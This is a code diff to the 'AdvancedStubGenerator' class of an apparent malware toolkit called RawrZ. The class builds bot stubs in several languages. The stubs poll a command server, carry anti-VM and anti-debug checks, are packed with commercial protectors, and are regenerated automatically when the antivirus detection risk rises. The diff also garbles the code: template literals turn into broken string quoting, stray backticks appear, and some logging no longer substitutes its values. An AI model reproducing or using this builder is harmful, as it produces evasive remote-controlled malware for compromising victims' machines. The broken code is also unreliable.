@@ -6,15 +6,29 @@ const fs = require('fs').promises;
 const path = require('path');
 const { exec, spawn } = require('child_process');
 const { promisify } = require('util');
+const { getMemoryManager } = require('../utils/memory-manager');
 const os = require('os');
 const zlib = require('zlib');
 
 const execAsync = promisify(exec);
 
 class AdvancedStubGenerator {
+    // Performance monitoring
+    static performance = {
+        monitor: (fn) => {
+            const start = process.hrtime.bigint();
+            const result = fn();
+            const end = process.hrtime.bigint();
+            const duration = Number(end - start) / 1000000; // Convert to milliseconds
+            if (duration > 100) { // Log slow operations
+                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+            }
+            return result;
+        }
+    }
     constructor() {
-        this.stubTemplates = new Map();
-        this.tempGenerators = new Map();
+        this.stubTemplates = this.memoryManager.createManagedCollection('stubTemplates', 'Map', 100);
+        this.tempGenerators = this.memoryManager.createManagedCollection('tempGenerators', 'Map', 100);
         this.fudTechniques = [
             'polymorphic', 'metamorphic', 'obfuscation', 'encryption',
             'packing', 'anti-debug', 'anti-vm', 'anti-sandbox',
@@ -25,7 +39,7 @@ class AdvancedStubGenerator {
             'godlike-obfuscation', 'ultimate-stealth', 'anti-everything'
         ];
         this.regenerationCount = 0;
-        this.activeStubs = new Map();
+        this.activeStubs = this.memoryManager.createManagedCollection('activeStubs', 'Map', 100);
         this.packingMethods = ['upx', 'themida', 'vmprotect', 'enigma', 'mpress', 'aspack', 'custom'];
         this.obfuscationLevels = ['none', 'basic', 'intermediate', 'advanced', 'extreme', 'godlike'];
         
@@ -215,7 +229,7 @@ class AdvancedStubGenerator {
             this.stubTemplates.set(template.id, template);
         }
 
-        logger.info(`Loaded ${templates.length} advanced stub templates including Godlike Stub with ALL encryption methods`);
+        logger.info("Loaded " + templates.length + " advanced stub templates including Godlike Stub with ALL encryption methods");
     }
 
     async initializeTempGenerators() {
@@ -251,7 +265,7 @@ class AdvancedStubGenerator {
             generationTime: '< 10 seconds'
         });
 
-        logger.info(`Initialized ${this.tempGenerators.size} temporary generators`);
+        logger.info("Initialized " + this.tempGenerators.size + " temporary generators");
     }
 
     async initializePackingMethods() {
@@ -314,7 +328,7 @@ class AdvancedStubGenerator {
             }
         };
 
-        logger.info(`Initialized ${Object.keys(this.packingMethods).length} packing methods`);
+        logger.info("Initialized " + Object.keys(this.packingMethods).length + " packing methods");
     }
 
     async initializeFUDTechniques() {
@@ -381,7 +395,7 @@ class AdvancedStubGenerator {
             }
         };
 
-        logger.info(`Initialized ${Object.keys(this.fudTechniques).length} FUD techniques`);
+        logger.info("Initialized " + Object.keys(this.fudTechniques).length + " FUD techniques");
     }
 
     async generateStub(options = {}) {
@@ -400,10 +414,10 @@ class AdvancedStubGenerator {
 
             const template = this.stubTemplates.get(templateId);
             if (!template) {
-                throw new Error(`Template ${templateId} not found`);
+                throw new Error("Template " + templateId + " not found");
             }
 
-            logger.info(`Generating ${template.name} stub with ALL encryption methods`);
+            logger.info("Generating " + template.name + " stub with ALL encryption methods");
 
             // Generate stub with all available encryption methods
             const stub = await this.createAdvancedStub({
@@ -450,7 +464,7 @@ class AdvancedStubGenerator {
                 obfuscationLevel
             });
 
-            logger.info(`Successfully generated ${template.name} stub with ID: ${botId}`);
+            logger.info(`Successfully generated ${template.name} stub with ID: botId`);
             return {
                 success: true,
                 botId,
@@ -569,10 +583,10 @@ class AdvancedStubGenerator {
         try {
             const encrypted = await this.advancedCrypto.encrypt(stub, algorithm);
             this.stats.encryptionMethodsUsed.add(algorithm);
-            logger.info(`Applied ${algorithm} encryption via Advanced Crypto Engine`);
+            logger.info("Applied " + algorithm + " encryption via Advanced Crypto Engine");
             return encrypted;
         } catch (error) {
-            logger.error(`Error applying ${algorithm} encryption:`, error);
+            logger.error("Error applying " + algorithm + " encryption:", error);
             return stub;
         }
     }
@@ -641,10 +655,10 @@ class AdvancedStubGenerator {
             encrypted += cipher.final('hex');
             
             this.stats.encryptionMethodsUsed.add(algorithm);
-            logger.info(`Applied ${algorithm} custom encryption`);
+            logger.info("Applied " + algorithm + " custom encryption");
             return encrypted;
         } catch (error) {
-            logger.error(`Error applying ${algorithm} custom encryption:`, error);
+            logger.error("Error applying " + algorithm + " custom encryption:", error);
             return stub;
         }
     }
@@ -666,16 +680,16 @@ class AdvancedStubGenerator {
         try {
             const packer = this.packingMethods[packingMethod];
             if (!packer) {
-                logger.warn(`Packing method ${packingMethod} not available`);
+                logger.warn("Packing method " + packingMethod + " not available");
                 return stub;
             }
 
             // Real packing process
             const packed = this.performRealPacking(stub, packingMethod);
-            logger.info(`Applied ${packer.name} packing`);
+            logger.info("Applied " + packer.name + " packing");
             return packed;
         } catch (error) {
-            logger.error(`Error applying ${packingMethod} packing:`, error);
+            logger.error("Error applying " + packingMethod + " packing:", error);
             return stub;
         }
     }
@@ -702,7 +716,7 @@ class AdvancedStubGenerator {
                     return stub;
             }
         } catch (error) {
-            logger.error(`Real packing failed for ${method}:`, error);
+            logger.error("Real packing failed for " + method + ":", error);
             return stub;
         }
     }
@@ -724,7 +738,7 @@ class AdvancedStubGenerator {
                     return stub;
             }
         } catch (error) {
-            logger.error(`Error applying ${level} obfuscation:`, error);
+            logger.error("Error applying " + level + " obfuscation:", error);
             return stub;
         }
     }
@@ -760,23 +774,23 @@ class AdvancedStubGenerator {
         const features = template.features.join(', ');
         const encryptionMethods = template.encryptionMethods.join(', ');
         
-        return `
+        return "
 // RawrZ Advanced Stub - ${template.name}
 // Features: ${features}
 // Encryption: ${encryptionMethods}
 // Generated: ${new Date().toISOString()}
 
-#include <windows.h>
-#include <wininet.h>
-#include <iostream>
-#include <string>
-#include <vector>
-#include <thread>
-#include <chrono>
-#include <random>
-#include <crypto++/aes.h>
-#include <crypto++/modes.h>
-#include <crypto++/filters.h>
+#include <windows.h>`
+#include <wininet.h>`
+#include <iostream>`
+#include <string>`
+#include <vector>`
+#include <thread>`
+#include <chrono>`
+#include <random>`
+#include <crypto++/aes.h>`
+#include <crypto++/modes.h>`
+#include <crypto++/filters.h>`
 
 class RawrZStub {
 private:
@@ -804,7 +818,7 @@ private:
     std::string encryptData(const std::string& data) {
         // Advanced encryption using multiple algorithms
         std::string encrypted = data;
-        // Apply ${encryptionMethods} encryption
+        // Apply " + encryptionMethods + " encryption
         return encrypted;
     }
     
@@ -902,14 +916,14 @@ int main() {
     stub.start();
     return 0;
 }
-`;
+";
     }
 
     generateCSharpStub(template, platform, serverUrl, botId) {
         const features = template.features.join(', ');
         const encryptionMethods = template.encryptionMethods.join(', ');
         
-        return `
+        return "
 // RawrZ Advanced Stub - ${template.name}
 // Features: ${features}
 // Encryption: ${encryptionMethods}
@@ -956,7 +970,7 @@ namespace RawrZStub {
         }
         
         private string EncryptData(string data) {
-            // Advanced encryption using ${encryptionMethods}
+            // Advanced encryption using " + encryptionMethods + "
             using (var aes = Aes.Create()) {
                 aes.Key = Encoding.UTF8.GetBytes(encryptionKey.PadRight(32).Substring(0, 32));
                 aes.IV = new byte[16];
@@ -1057,14 +1071,14 @@ namespace RawrZStub {
         }
     }
 }
-`;
+";
     }
 
     generateGoStub(template, platform, serverUrl, botId) {
         const features = template.features.join(', ');
         const encryptionMethods = template.encryptionMethods.join(', ');
         
-        return `
+        return "
 // RawrZ Advanced Stub - ${template.name}
 // Features: ${features}
 // Encryption: ${encryptionMethods}
@@ -1231,21 +1245,21 @@ func main() {
     stub := &RawrZStub{
         serverURL:     "${serverUrl}",
         botID:         "${botId}",
-        encryptionKey: "${crypto.randomBytes(32).toString('hex')}",
+        encryptionKey: `${crypto.randomBytes(32).toString('hex')}`,
         isRunning:     true,
         httpClient:    &http.Client{Timeout: 30 * time.Second},
     }
     
     stub.start()
 }
-`;
+";
     }
 
     generateRustStub(template, platform, serverUrl, botId) {
         const features = template.features.join(', ');
         const encryptionMethods = template.encryptionMethods.join(', ');
         
-        return `
+        return "
 // RawrZ Advanced Stub - ${template.name}
 // Features: ${features}
 // Encryption: ${encryptionMethods}
@@ -1269,7 +1283,7 @@ struct RawrZStub {
 }
 
 impl RawrZStub {
-    fn new() -> Self {
+    fn new() ->` Self {
         Self {
             server_url: "${serverUrl}".to_string(),
             bot_id: "${botId}".to_string(),
@@ -1290,7 +1304,7 @@ impl RawrZStub {
     }
     
     fn encrypt_data(&self, data: &str) -> String {
-        // Advanced encryption using ${encryptionMethods}
+        // Advanced encryption using " + encryptionMethods + "
         let key = Key::from_slice(self.encryption_key.as_bytes());
         let cipher = Aes256Gcm::new(key);
         let nonce = Nonce::from_slice(b"unique nonce");
@@ -1407,14 +1421,14 @@ fn main() {
     let stub = RawrZStub::new();
     stub.start();
 }
-`;
+";
     }
 
     generatePythonStub(template, platform, serverUrl, botId) {
         const features = template.features.join(', ');
         const encryptionMethods = template.encryptionMethods.join(', ');
         
-        return `
+        return "
 # RawrZ Advanced Stub - ${template.name}
 # Features: ${features}
 # Encryption: ${encryptionMethods}
@@ -1460,7 +1474,7 @@ class RawrZStub:
         return any(indicator in os.environ.get('COMPUTERNAME', '').lower() for indicator in vm_indicators)
     
     def encrypt_data(self, data):
-        # Advanced encryption using ${encryptionMethods}
+        # Advanced encryption using " + encryptionMethods + "
         try:
             encrypted = self.cipher.encrypt(data.encode())
             return base64.b64encode(encrypted).decode()
@@ -1549,14 +1563,14 @@ class RawrZStub:
 if __name__ == "__main__":
     stub = RawrZStub()
     stub.start()
-`;
+";
     }
 
     generateJavaScriptStub(template, platform, serverUrl, botId) {
         const features = template.features.join(', ');
         const encryptionMethods = template.encryptionMethods.join(', ');
         
-        return `
+        return "
 // RawrZ Advanced Stub - ${template.name}
 // Features: ${features}
 // Encryption: ${encryptionMethods}
@@ -1586,7 +1600,7 @@ class RawrZStub {
     }
     
     encryptData(data) {
-        // Advanced encryption using ${encryptionMethods}
+        // Advanced encryption using " + encryptionMethods + "
         try {
             const key = crypto.scryptSync(this.encryptionKey, 'salt', 32);
             const iv = crypto.randomBytes(16);
@@ -1707,7 +1721,7 @@ class RawrZStub {
                 const options = {
                     hostname: new URL(this.serverUrl).hostname,
                     port: new URL(this.serverUrl).port || 80,
-                    path: `/http-bot/command/` + this.botId,
+                    path: "/http-bot/command/` + this.botId,
                     method: 'GET',
                     headers: {
                         'User-Agent': 'RawrZBot/1.0'
@@ -1783,10 +1797,10 @@ stub.start();
         try {
             const existingStub = this.activeStubs.get(botId);
             if (!existingStub) {
-                throw new Error(`Stub ${botId} not found`);
+                throw new Error("Stub " + botId + " not found");
             }
 
-            logger.info(`Regenerating stub ${botId} with new options`);
+            logger.info("Regenerating stub " + botId + " with new options");
 
             // Update options with existing settings
             const options = {
@@ -1806,7 +1820,7 @@ stub.start();
 
             return result;
         } catch (error) {
-            logger.error(`Error regenerating stub ${botId}:`, error);
+            logger.error("Error regenerating stub " + botId + ":", error);
             return {
                 success: false,
                 error: error.message
@@ -1843,7 +1857,7 @@ stub.start();
                 return { success: false, error: 'Stub not found' };
             }
         } catch (error) {
-            logger.error(`Error deleting stub ${botId}:`, error);
+            logger.error("Error deleting stub " + botId + ":", error);
             return { success: false, error: error.message };
         }
     }
@@ -1862,8 +1876,8 @@ stub.start();
 
     // FUD Regeneration Features
     async initializeFUDRegeneration() {
-        this.detectionTriggers = new Map();
-        this.regenerationSchedules = new Map();
+        this.detectionTriggers = this.memoryManager.createManagedCollection('detectionTriggers', 'Map', 100);
+        this.regenerationSchedules = this.memoryManager.createManagedCollection('regenerationSchedules', 'Map', 100);
         this.autoRegenerationEnabled = false;
         this.detectionThresholds = {
             signatureDetection: 0.8,
@@ -1897,10 +1911,10 @@ stub.start();
                 const detectionScore = await this.analyzeDetectionRisk(stub);
                 
                 if (detectionScore > this.detectionThresholds.signatureDetection) {
-                    logger.warn(`High detection risk for stub ${botId}: ${detectionScore}`);
+                    logger.warn(`High detection risk for stub ${botId}: detectionScore`);
                     await this.triggerAutoRegeneration(botId, 'signature_detection');
                 } else if (detectionScore > this.detectionThresholds.behaviorAnalysis) {
-                    logger.warn(`Medium detection risk for stub ${botId}: ${detectionScore}`);
+                    logger.warn(`Medium detection risk for stub ${botId}: detectionScore`);
                     await this.scheduleRegeneration(botId, 'behavior_analysis');
                 }
             }
@@ -1976,7 +1990,7 @@ stub.start();
 
     async triggerAutoRegeneration(botId, reason) {
         try {
-            logger.info(`Triggering auto-regeneration for ${botId} due to: ${reason}`);
+            logger.info(`Triggering auto-regeneration for ${botId} due to: reason`);
             
             const newOptions = {
                 encryptionMethods: this.generateRandomEncryptionMethods(),
@@ -1995,7 +2009,7 @@ stub.start();
 
             return result;
         } catch (error) {
-            logger.error(`Error in auto-regeneration for ${botId}:`, error);
+            logger.error("Error in auto-regeneration for " + botId + ":", error);
             return { success: false, error: error.message };
         }
     }
@@ -2009,7 +2023,7 @@ stub.start();
             status: 'scheduled'
         });
 
-        logger.info(`Scheduled regeneration for ${botId} at ${scheduleTime.toISOString()}`);
+        logger.info(`Scheduled regeneration for ${botId} at scheduleTime.toISOString()`);
     }
 
     generateRandomEncryptionMethods() {
@@ -2037,10 +2051,10 @@ stub.start();
                 const health = await this.checkStubHealth(stub);
                 
                 if (health.status === 'critical') {
-                    logger.warn(`Critical health for stub ${botId}: ${health.reason}`);
+                    logger.warn(`Critical health for stub ${botId}: health.reason`);
                     await this.triggerAutoRegeneration(botId, 'health_critical');
                 } else if (health.status === 'warning') {
-                    logger.warn(`Warning health for stub ${botId}: ${health.reason}`);
+                    logger.warn(`Warning health for stub ${botId}: health.reason`);
                     await this.scheduleRegeneration(botId, 'health_warning');
                 }
             }
@@ -2124,8 +2138,8 @@ stub.start();
 
     // Unpack/Repack System
     async initializeUnpackRepackSystem() {
-        this.unpackedStubs = new Map();
-        this.repackHistory = new Map();
+        this.unpackedStubs = this.memoryManager.createManagedCollection('unpackedStubs', 'Map', 100);
+        this.repackHistory = this.memoryManager.createManagedCollection('repackHistory', 'Map', 100);
         this.unpackMethods = {
             'upx': this.unpackUPX.bind(this),
             'themida': this.unpackThemida.bind(this),
@@ -2142,7 +2156,7 @@ stub.start();
     async unpackStub(stubData, packingMethod, options = {}) {
         try {
             const unpackId = this.generateUnpackId();
-            logger.info(`Unpacking stub with ${packingMethod} method`);
+            logger.info("Unpacking stub with " + packingMethod + " method");
 
             const unpackMethod = this.unpackMethods[packingMethod];
             if (!unpackMethod) {
@@ -2182,14 +2196,14 @@ stub.start();
         try {
             const unpackedStub = this.unpackedStubs.get(unpackId);
             if (!unpackedStub) {
-                throw new Error(`Unpacked stub ${unpackId} not found`);
+                throw new Error("Unpacked stub " + unpackId + " not found");
             }
 
-            logger.info(`Repacking stub ${unpackId} with ${newPackingMethod}`);
+            logger.info(`Repacking stub ${unpackId} with newPackingMethod`);
 
             // Apply new encryption methods
             let repackedData = unpackedStub.unpackedData;
-            if (newEncryptionMethods.length > 0) {
+            if (newEncryptionMethods.length >` 0) {
                 repackedData = await this.applyAllEncryptionLayers(repackedData, newEncryptionMethods);
             }
 
@@ -2376,7 +2390,7 @@ stub.start();
                 return { success: false, error: 'Unpacked stub not found' };
             }
         } catch (error) {
-            logger.error(`Error deleting unpacked stub ${unpackId}:`, error);
+            logger.error("Error deleting unpacked stub " + unpackId + ":", error);
             return { success: false, error: error.message };
         }
     }
@@ -2430,7 +2444,7 @@ stub.start();
 
         let entropy = 0;
         for (let i = 0; i < 256; i++) {
-            if (frequencies[i] > 0) {
+            if (frequencies[i] >` 0) {
                 const p = frequencies[i] / bytes.length;
                 entropy -= p * Math.log2(p);
             }
@@ -2637,7 +2651,7 @@ stub.start();
             this.monitoringData.detection.detectionTimeline.shift();
         }
 
-        logger.warn(`Detection recorded: ${type} (${severity})`, details);
+        logger.warn("Detection recorded: ${type} (" + severity + ")", details);
     }
 
     async getComprehensiveStats() {
@@ -2692,7 +2706,7 @@ stub.start();
         if (times.length < 5) return 'low';
         
         const recent = times.slice(-5);
-        const avg = recent.reduce((sum, time) => sum + time, 0) / recent.length;
+        const avg = recent.reduce((sum, time) =>` sum + time, 0) / recent.length;
         
         if (avg > 60000) return 'high';
         if (avg > 30000) return 'medium';
@@ -2747,9 +2761,9 @@ stub.start();
         const hours = Math.floor(minutes / 60);
         const days = Math.floor(hours / 24);
         
-        if (days > 0) return `${days}d ${hours % 24}h ${minutes % 60}m`;
-        if (hours > 0) return `${hours}h ${minutes % 60}m`;
-        if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
+        if (days > 0) return "${days}d ${hours % 24}h " + minutes % 60 + "m";
+        if (hours > 0) return "${hours}h " + minutes % 60 + "m";
+        if (minutes > 0) return "${minutes}m " + seconds % 60 + "s";
         return `${seconds}s`;
     }
 
@@ -2897,7 +2911,7 @@ stub.start();
             const ageInHours = (now - generatedAt) / (1000 * 60 * 60);
             
             // Performance degrades with age
-            if (ageInHours > 168) return 'degraded'; // 1 week
+            if (ageInHours >` 168) return 'degraded'; // 1 week
             if (ageInHours > 72) return 'good'; // 3 days
             return 'good';
         } catch (error) {
